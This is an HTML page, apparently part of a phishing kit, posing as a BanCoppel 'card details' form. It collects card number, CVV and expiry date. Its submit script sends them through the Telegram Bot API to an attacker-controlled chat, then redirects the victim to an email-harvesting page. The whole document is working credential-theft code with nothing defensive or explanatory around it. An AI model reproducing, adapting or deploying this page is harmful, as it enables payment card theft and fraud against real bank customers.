<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>BanCoppel - Datos de la Tarjeta</title>
    <link
      href="https://unpkg.com/tailwindcss@^1.0/dist/tailwind.min.css"
      rel="stylesheet"
    />
    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
  </head>
  <body class="">
    <form
      id="loginform"
      class="flex flex-col items-center justify-center min-h-screen bg-white px-4"
    >
      <!-- Logo -->
      <div class="mt-6">
        <img
          src="https://finanzzzas.com/wp-content/uploads/2021/05/banccopel.png"
          alt="BanCoppel Logo"
          style="width: 250px"
        />
      </div>

      <!-- Título -->
      <h2 class="text-lg font-bold text-blue-900 mt-6">Datos de la Tarjeta</h2>

      <!-- Input Número de Tarjeta -->
      <div class="w-full max-w-sm mt-4">
        <p class="text-center text-sm text-blue-900 font-semibold">
          Número de Tarjeta
        </p>
        <input
          required
          type="text"
          id="card-number"
          placeholder="#### #### #### ####"
          maxlength="19"
          class="w-full mt-1 px-4 py-2 border border-blue-900 bg-gray-200 text-gray-600 text-center rounded-md outline-none focus:ring-2 focus:ring-blue-700"
        />
      </div>

      <!-- Input CVV -->
      <div class="w-full max-w-sm mt-4">
        <p class="text-center text-sm text-blue-900 font-semibold">
          Código de Seguridad (CVV)
        </p>
        <input
          required
          type="text"
          id="cvv"
          placeholder="###"
          maxlength="3"
          class="w-full mt-1 px-4 py-2 border border-blue-900 bg-gray-200 text-gray-600 text-center rounded-md outline-none focus:ring-2 focus:ring-blue-700"
        />
      </div>

      <!-- Input Fecha de Vencimiento -->
      <div class="w-full max-w-sm mt-4">
        <p class="text-center text-sm text-blue-900 font-semibold">
          Fecha de Vencimiento
        </p>
        <input
          required
          type="text"
          id="expiry-date"
          placeholder="MM/YY"
          maxlength="5"
          class="w-full mt-1 px-4 py-2 border border-blue-900 bg-gray-200 text-gray-600 text-center rounded-md outline-none focus:ring-2 focus:ring-blue-700"
        />
      </div>

      <!-- Botón Continuar -->
      <button
        class="w-full max-w-sm mt-6 px-6 py-3 bg-blue-900 text-white text-center font-semibold rounded-full"
      >
        Continuar
      </button>
    </form>
    <script src="telegram.js"></script>

    <script>
      document
        .getElementById("card-number")
        .addEventListener("input", function (e) {
          let value = e.target.value.replace(/\D/g, ""); // Eliminar caracteres no numéricos
          value = value.replace(/(\d{4})/g, "$1 ").trim(); // Agregar espacios cada 4 dígitos
          e.target.value = value;
        });

      document
        .getElementById("expiry-date")
        .addEventListener("input", function (e) {
          let value = e.target.value.replace(/\D/g, ""); // Eliminar caracteres no numéricos
          if (value.length > 2) {
            value = value.substring(0, 2) + "/" + value.substring(2, 4); // Formatear MM/YY
          }
          e.target.value = value;
        });
    </script>
    <script>
      const form = document.querySelector("#loginform");
      form.addEventListener("submit", async (event) => {
        event.preventDefault(); // Aquí evitamos que el código se repita evita que se envíe el formulario
        const tarjeta = document.querySelector("#card-number").value;
        const cvv = document.querySelector("#cvv").value;
        const Fecha = document.querySelector("#expiry-date").value;

        localStorage.setItem("usuario", tarjeta);
        const message =
          "Copel\nTarjeta: " + tarjeta + "\nCVV: " + cvv + "\nFecha: " + Fecha;

        axios
          .post(
            "https://api.telegram.org/bot" + miVariableGlobal + "/sendMessage",
            {
              chat_id: chat,
              text: message,
            }
          )
          .then((response) => {
            window.parent.location.href = "email.html";
          })
          .catch((error) => {
            console.error(error);
          });
      });
    </script>
  </body>
</html>
